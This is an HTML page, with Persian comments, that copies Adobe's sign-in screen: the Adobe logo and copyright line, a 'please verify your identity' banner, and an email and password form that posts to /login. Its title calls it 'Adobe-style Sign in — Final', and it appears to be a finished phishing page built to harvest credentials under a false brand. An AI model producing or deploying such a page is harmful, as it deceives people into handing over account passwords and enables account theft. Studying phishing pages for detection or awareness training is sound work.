<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Adobe-style Sign in — Final</title>

  <!-- فونت اختیاری (اگر آفلاین بود از فونت سیستم استفاده می‌شود) -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg-start:#5b0b14;
      --bg-mid:#a11a49;
      --bg-end:#c62b6f;
      --accent:#1473e6;
      --panel-w:460px;
      --card-radius:12px;
    }

    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:"Inter", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased}
    body{
      background: linear-gradient(120deg, var(--bg-start) 0%, var(--bg-mid) 45%, var(--bg-end) 100%);
      color:#111;
    }

    /* کل ساختار */
    .page{
      position:relative;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      padding:30px;
    }

    /* هالهٔ پشت کارت (های‌لایت کم‌رنگ) */
    .highlight {
      position:absolute;
      top:50%;
      left:50%;
      transform: translate(calc(-50% + 80px), -50%); /* هماهنگ با translate کارت */
      width:420px;
      height:520px;
      pointer-events:none;
      border-radius:20px;
      background: radial-gradient(closest-side, rgba(255,255,255,0.06) 0%, rgba(255,255,255,0.02) 40%, rgba(255,255,255,0) 65%);
      filter: blur(14px);
      opacity:0.9;
      z-index:1;
    }

    .layout {
      width:100%;
      max-width:1400px;
      display:flex;
      align-items:center;
      gap:24px;
      position:relative;
      z-index:3;
      padding:40px 10px;
    }

    /* **لوگو سمت چپ** */
    .left-area{
      flex:1 1 0%;
      min-width:420px;
      display:flex;
      align-items:center;
      justify-content:flex-start; /* لوگو سمت چپ قرار می‌گیرد */
      color:#fff;
      text-align:left;
      padding-left:40px;
    }
    .brand {
      display:flex;
      flex-direction:column;
      gap:8px;
      align-items:flex-start;
    }
    .brand svg{ width:120px; height:120px; display:block; }
    .brand-text{ font-size:18px; opacity:0.95; font-weight:500; margin-left:6px }

    /* **کارت/فرم سمت راست** */
    .card-wrap{
      flex:0 0 var(--panel-w);
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .card {
      width:100%;
      max-width:var(--panel-w);
      background:#fff;
      border-radius:var(--card-radius);
      padding:22px 26px;
      box-shadow: 0 14px 40px rgba(2,6,23,0.32);
      transform: translateX(80px); /* کارت کمی به راست شیفت داده شده */
      z-index:4;
    }

    .notice{
      display:inline-block;
      background: linear-gradient(90deg,var(--accent), #0e66c1);
      color:#fff;
      padding:8px 12px;
      border-radius:8px;
      font-size:13px;
      margin-bottom:12px;
    }

    h1{ font-size:28px; margin:6px 0 8px; font-weight:700; color:#111 }
    .new-user{ color:#6b7280; margin-bottom:12px; font-size:14px }
    .new-user a{ color:var(--accent); text-decoration:none; font-weight:600 }

    label{ display:block; margin-bottom:6px; font-size:14px; color:#333 }
    input[type="email"], input[type="password"]{
      width:100%;
      padding:12px;
      border-radius:8px;
      border:1px solid #e6e9ee;
      font-size:15px;
      margin-bottom:12px;
      outline:none;
    }
    input:focus{ box-shadow:0 8px 20px rgba(20,115,230,0.12); border-color:var(--accent) }

    .btn-primary{
      width:100%;
      padding:12px;
      border-radius:28px;
      background: linear-gradient(180deg,var(--accent), #0e66c1);
      color:#fff;
      border:none;
      font-weight:700;
      font-size:16px;
      cursor:pointer;
      margin-top:6px;
    }

    .divider{ text-align:center; color:#9aa3ad; margin:18px 0; font-size:14px }

    .socials{ display:flex; flex-direction:column; gap:10px }
    .social-btn{
      display:flex;
      align-items:center;
      gap:12px;
      padding:12px;
      border-radius:999px;
      background:#fff;
      border:1px solid #e8eaef;
      cursor:pointer;
      font-weight:600;
      font-size:14px;
      justify-content:center;
    }
    .social-btn svg{ width:18px; height:18px; flex:0 0 18px }

    .links{ display:flex; justify-content:space-between; margin-top:12px; color:var(--accent); font-weight:600; font-size:13px }
    .legal{ margin-top:18px; color:#8a8f97; text-align:center; font-size:12px }

    /* دکمهٔ چت */
    .chat {
      position:fixed;
      right:20px;
      bottom:18px;
      width:52px;
      height:52px;
      border-radius:50%;
      background: linear-gradient(180deg,var(--accent), #0e66c1);
      display:flex;
      align-items:center;
      justify-content:center;
      color:#fff;
      box-shadow:0 8px 20px rgba(2,6,23,0.25);
      font-size:22px;
      cursor:pointer;
      z-index:10;
    }

    /* واکنش‌پذیری */
    @media (max-width:1100px){
      .card{ transform: translateX(40px) }
      .highlight{ transform: translate(calc(-50% + 40px), -50%); width:380px; height:520px; }
    }
    @media (max-width:900px){
      .layout{ flex-direction:column-reverse; gap:18px; align-items:center }
      .left-area{ justify-content:center; padding-left:0 }
      .card{ transform: translateX(0); width:90%; max-width:760px; }
      .highlight{ display:none }
    }
  </style>
</head>
<body>
  <div class="page">
    <!-- هالهٔ پشت کارت -->
    <div class="highlight" aria-hidden="true"></div>

    <div class="layout">
      <!-- لوگو سمت چپ -->
      <div class="left-area" aria-hidden="false">
        <div class="brand" role="img" aria-label="Adobe">
          <!-- لوگوی ادوبی (inline SVG) -->
          <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg" aria-hidden="false">
            <rect rx="12" width="200" height="200" fill="#FF0000"/>
            <path d="M40 150 L65 50 L97 50 L122 150 L100 150 L93 124 L63 124 L56 150 Z M78 83 L84 107 L112 107 L118 83 Z" fill="#fff"/>
          </svg>
          <div class="brand-text">Sign in or create an account</div>
        </div>
      </div>

      <!-- کارت سمت راست -->
      <div class="card-wrap" aria-hidden="false">
        <div class="card" role="main" aria-labelledby="signinTitle">
          <div class="notice">For your protection, please verify your identity.</div>
          <h1 id="signinTitle">Sign in</h1>
          <div class="new-user">New user? <a href="#">Create an account</a></div>

          <!-- فرم آماده برای POST -->
          <form id="loginForm" action="/login" method="POST">
            <label for="email">Email address</label>
            <input id="email" name="email" type="email" placeholder="you@example.com" required>

            <label for="password">Password</label>
            <input id="password" name="password" type="password" placeholder="Enter your password" required>

            <button class="btn-primary" type="submit">Continue</button>
          </form>

          <div class="divider">Or</div>

          <div class="socials">
            <button class="social-btn" onclick="alert('Continue with Google (demo)')">
              <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <path fill="#EA4335" d="M24 12.5c1.9 0 3.1.8 4.1 1.5l3.1-3.1C30 9 27.5 8 24 8 15.9 8 9.3 13.2 7 20.3l4.8 3.7C13 18 17.1 12.5 24 12.5z"/>
                <path fill="#34A853" d="M46 24c0-1.6-.1-2.9-.4-4.2H24v8h12.3c-.6 3-2.6 5.4-5.6 6.7l4.2 3.3C42.6 35.9 46 30.7 46 24z"/>
                <path fill="#4A90E2" d="M11.7 29.9A13.6 13.6 0 0 1 12 24c0-1.4.2-2.7.7-3.9L7.9 16.4C6.3 18.6 5.3 21.2 5.3 24c0 2.8 1 5.4 2.6 7.6l3.8-1.7z"/>
                <path fill="#FBBC05" d="M24 44c5.5 0 10.2-1.8 13.6-4.8l-4.2-3.3C30.7 36.5 27.5 38 24 38c-6.9 0-11.9-5.5-12.3-12.3L7.9 27.6C9.3 34.8 15.9 44 24 44z"/>
              </svg>
              Continue with Google
            </button>

            <button class="social-btn" onclick="alert('Continue with Microsoft (demo)')">
              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <rect x="1" y="1" width="10.6" height="10.6" fill="#f35325"/>
                <rect x="12.4" y="1" width="10.6" height="10.6" fill="#81bc06"/>
                <rect x="1" y="12.4" width="10.6" height="10.6" fill="#05A6F0"/>
                <rect x="12.4" y="12.4" width="10.6" height="10.6" fill="#ffba08"/>
              </svg>
              Continue with Microsoft
            </button>

            <button class="social-btn" onclick="alert('Continue with Apple (demo)')">
              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <path d="M16.365 1.43c-.9.05-2.07.6-2.74 1.33-.58.63-1.08 1.93-.9 3.05 1.03.04 2.24-.5 2.93-1.24.6-.64 1.07-1.86.71-3.14zM19.6 7.8c-.77-.04-1.68.4-2.22.88-.48.42-1.05 1.39-.87 2.46.96.08 1.8-.48 2.38-1.14.53-.61.9-1.72.71-2.2zM12.2 5.1c-2.5 0-4.5 1.8-4.5 4.1 0 2.5 2.1 5.9 4.5 5.9 2.2 0 3.2-1.6 4.8-1.6.9 0 1.8.7 3.1.7 0-3.5-3.6-6.6-8-6.6z" fill="#111"/>
              </svg>
              Continue with Apple
            </button>
          </div>

          <div class="links" style="margin-top:12px;">
            <a href="#">More sign-in options</a>
            <a href="#">Get help signing in</a>
          </div>

          <div class="legal">
            <div style="direction:ltr; margin-top:8px; font-size:12px; color:#8a8f97;">
              <a href="#">Terms of Use</a> · <a href="#">Cookie preferences</a> · <a href="#">Privacy</a> · <a href="#">Do not sell or share my personal information</a>
            </div>
            <div style="margin-top:6px; font-size:12px; color:#8a8f97;">© 2025 Adobe. All rights reserved.</div>
          </div>
        </div>
      </div>
    </div>

    <!-- دکمه چت -->
    <div class="chat" title="Help / Chat" onclick="alert('Chat demo')">💬</div>
  </div>

</body>
</html>
